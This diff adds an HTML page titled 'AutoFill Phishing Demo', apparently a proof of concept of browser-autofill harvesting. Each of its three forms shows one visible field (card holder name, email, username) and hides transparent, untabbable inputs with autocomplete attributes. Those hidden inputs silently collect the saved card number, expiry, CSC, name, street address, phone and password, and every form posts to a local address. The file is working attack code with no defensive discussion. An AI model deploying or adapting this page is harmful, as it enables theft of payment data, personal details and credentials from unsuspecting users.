@@ -1,0 +1,281 @@
+<!doctype html>
+<html>
+  <head>
+    <title>AutoFill Phishing Demo</title>
+    <style>
+	.transparent-field {
+		position: absolute;
+		opacity: 0;
+		pointer-events: none;
+	}
+	.zero-size{
+		width:0;
+		height:0;
+		transform: scale(0)
+	}
+	body{
+		font-family: monospace;
+		display:flex;
+		flex-direction:column;
+		margin: 15rem auto;
+		max-width: 80rem;
+		justify-content:center;
+		text-align:center;
+		align-items:center;
+		background: #081729;
+	}
+	.container{
+    display:flex;
+    flex-direction:column;
+    border: 2px solid black;
+    border-radius: 25px;
+    width: 30rem;
+    margin-top: 1rem;
+    justify-content:center;
+    text-align:center;
+    background-color: #f9f9f9;
+    margin-bottom: 10px;
+    box-shadow: 0px 0px 10px 4px rgba(255, 255, 255, 0.2);
+    padding:1rem;
+	}
+	.form-class{
+		margin-bottom: 1rem;
+	}
+ 	.submitbtn {
+    background-color: rgb(255, 255, 255);
+    margin: auto;
+    margin-top: 2rem;
+    width: 80%;
+    height: 2.5rem;
+    cursor: pointer;
+    color: black;
+    font-weight: 800;
+    font-size: 20px;
+    border-radius: 25px;
+    border: 2px solid black;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.5s;
+    box-shadow: -0px 0px 0px black;
+	}
+	.submitbtn:hover {
+    box-shadow: 10px 8px 0px black;
+    border: 2px solid black;
+	}
+	/* BORDER EFFECT */
+	.submitbtn-border{
+		background-color: rgb(255, 255, 255);
+    margin: auto;
+    margin-top: 2rem;
+    width: 80%;
+    height: 2.5rem;
+    cursor: pointer;
+    font-weight: 800;
+    font-size: 20px;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.5s;
+    box-shadow: -0px 0px 0px black;
+		text-decoration: none;
+		border:2px solid black;
+		border-radius: 25px;
+	}
+	.submitbtn-border:hover{
+		box-shadow: 10px 8px 0px black;
+		animation: border-animate 0s linear infinite;
+	}
+	.submitbtn-border::before{
+		content: "";
+		position: absolute;
+		left: 0;
+		top:0;
+		width: 4rem;
+		height: 2rem;
+		background-color: #120331;
+		transform: translate(-50%, -50%);
+		border-radius: 50%;
+		animation: border-animate 5s linear infinite;
+		filter: blur(2px);
+		opacity: 1; 
+		transition: all .25s ease-in-out;
+	}
+	@keyframes border-animate{
+		0%{
+			left: 0%;
+			top: 0%;
+		}
+		45%{
+			left: 100%;
+			top: 0%;
+		}
+		50%{
+			left: 100%;
+			top: 100%;
+		}
+		95%{
+			left: 0%;
+			top: 100%;
+		}
+		100%{
+			left: 0%;
+			top: 0%;
+		}
+	}
+	.submitbtn-border:hover::before{
+		opacity: 0;
+		border: solid 2px#120331;
+	}
+	.submitbtn-border::after{
+		content: "Submit";
+		position: absolute;
+		top:5%;
+		left:.5%;
+		width: 99%;
+		height: 90%;
+		background-color: #ffffff;
+		border-radius: inherit;
+		display: flex;
+    align-items: center;
+    justify-content: center;
+	}
+	/* BORDER EFFECT */
+
+	/* SHINE EFFECT */
+	.submitbtn-shine:before {
+		content: '';
+		position: absolute;
+		width: 100px;
+		height: 100%;
+		background-image: linear-gradient(
+			120deg,
+			rgba(255,255,255, 0)30%,
+			rgba(255, 255, 255, 0.8),
+			rgba(255,255,255, 0) 70%
+		);
+		top: 0;
+		left: -100px;
+		animation: shine 5s infinite linear;
+	}
+	@keyframes shine {
+    0% {
+      left: -100%;
+    }
+    50% {
+      left: 100%;
+    }
+    100% {
+      left: 100%;
+    }
+	}
+	/* END SHINE EFFECT */
+
+	.inputClass{
+		padding:.5em 1em;
+		font-size: 1rem;
+		border-radius: 5px;
+		border: 1px solid black
+	}
+    </style>
+  </head>
+  <body>
+	<div class="container">
+		<h2>ID Confirmation (Bank Details)</h2>
+		<form class="form-class" action="http://127.0.0.1:443" method="post">
+			<label for="email" style="margin-bottom: 4px; display:block;">Card Holder Name</label>
+			<input class="inputClass" autocomplete="cc-name" placeholder="Card holder name...">
+			
+			<label for="cc-given-name" class="transparent-field" tabindex=-1>cc-given-name</label>
+			<input autocomplete="cc-given-name" class="transparent-field" tabindex=-1>
+			
+			<label for="cc-given-name" class="transparent-field" tabindex=-1>cc-given-name</label>
+			<input autocomplete="cc-additional-name" class="transparent-field" tabindex=-1>
+			
+			<label for="cc-given-name" class="transparent-field" tabindex=-1>cc-given-name</label>
+			<input autocomplete="cc-family-name" class="transparent-field" tabindex=-1>
+			
+			<label for="cc-number" class="transparent-field" tabindex=-1>cc-number</label>
+			<input autocomplete="cc-number" class="transparent-field" tabindex=-1> 
+			
+			<label for="cc-exp" class="transparent-field" tabindex=-1>cc-exp</label>
+			<input autocomplete="cc-exp" class="transparent-field" tabindex=-1>
+			
+			<label for="cc-exp-month" class="transparent-field" tabindex=-1>cc-exp-month</label>
+			<input autocomplete="cc-exp-month" class="transparent-field" tabindex=-1>
+			
+			<label for="cc-exp-year" class="transparent-field" tabindex=-1>cc-exp-year</label>
+			<input autocomplete="cc-exp-year" class="transparent-field" tabindex=-1>
+			
+			<label for="cc-csc" class="transparent-field" tabindex=-1>cc-csc</label>
+			<input autocomplete="cc-csc	" class="transparent-field" tabindex=-1>
+			
+			<label for="cc-type" class="transparent-field" tabindex=-1>cc-type</label>
+			<input autocomplete="cc-type" class="transparent-field" tabindex=-1>
+			<br>
+			<button class="submitbtn-border" type="submit" value="Subscribe"></button>
+		</form>
+	</div>
+	
+	<div class="container">
+	<h2>Subscribe To Email List (PII)</h2>
+		<form class="form-class" action="http://127.0.0.1:443" method="post">
+			<div style="display:flex; margin: auto; justify-content:center;width:50%; flex-direction:column; ">
+				<label for="email" style="margin-bottom: 4px; text-align: left;">Email</label>
+				<input class="inputClass" name="email" placeholder="example@mail.com..." autocomplete="email">
+			</div>
+
+			<label for="name" class="transparent-field" tabindex=-1>name</label>
+			<input autocomplete="name" name="name" class="transparent-field" tabindex=-1>
+			
+			<label for="organization" class="transparent-field" tabindex=-1>organization</label>
+			<input autocomplete="organization" name="organization" class="transparent-field" tabindex=-1>
+			
+			<label for="street-address" class="transparent-field" tabindex=-1>street-address</label>
+			<input autocomplete="street-address" name="street-address" class="transparent-field" tabindex=-1>
+			
+			<label for="address-line1" class="transparent-field" tabindex=-1>street address 1</label>
+			<input autocomplete="address-line1" name="street address 1" class="transparent-field" tabindex=-1>
+			
+			<label for="address-line2" class="transparent-field" tabindex=-1>street address 2</label>
+			<input autocomplete="address-line2" name="street address 2" class="transparent-field" tabindex=-1>
+						
+			<label for="address-level2" class="transparent-field" tabindex=-1>City/Town</label>
+			<input autocomplete="address-level2" name="City/Town" class="transparent-field" tabindex=-1> 
+			
+			<label for="address-level1" class="transparent-field" tabindex=-1>Country</label>
+			<input autocomplete="address-level1" name="Country" class="transparent-field" tabindex=-1>
+			
+			<label for="postal-code" class="transparent-field" tabindex=-1>postal-code</label>
+			<input autocomplete="postal-code" name="postal-code" class="transparent-field" tabindex=-1>
+			
+			<label for="country-name" class="transparent-field" tabindex=-1>country-name</label>
+			<input autocomplete="country-name" name="country-name" class="transparent-field" tabindex=-1>
+			
+			<label for="tel" class="transparent-field" tabindex=-1>telephone</label>
+			<input autocomplete="tel" name="telephone" class="transparent-field" tabindex=-1>
+			<br>
+			<button class="submitbtn submitbtn-shine" type="submit" value="Subscribe">Submit</button>
+		</form>
+	</div>
+	
+	<div class="container" >
+		<h2>Verify your account details (Password)</h2>
+		<form class="form-class" action="http://127.0.0.1:443" method="post">
+			<label for="username">Username</label>
+			<input class="inputClass" name="username" autocomplete="username" placeholder="Username...">
+			
+			<label for="password" class="transparent-field" tabindex=-1>password</label>
+			<input type="password" id="password" name="password" autocomplete="password" class="transparent-field" tabindex=-1>
+			<br>
+			<input class="submitbtn" type="submit" value="Submit">
+		</form>
+	</div>
+	<script>
+		/* REMOVE THIS COMMENT TO TEST IN CONSOLE
+		document.querySelectorAll('input').forEach(function(input) { input.addEventListener('input', function(event){
+				console.log(event.target.name + ":" + event.target.value)
+			}); 
+		});
+		*/
+	</script>
+  </body>
+</html>
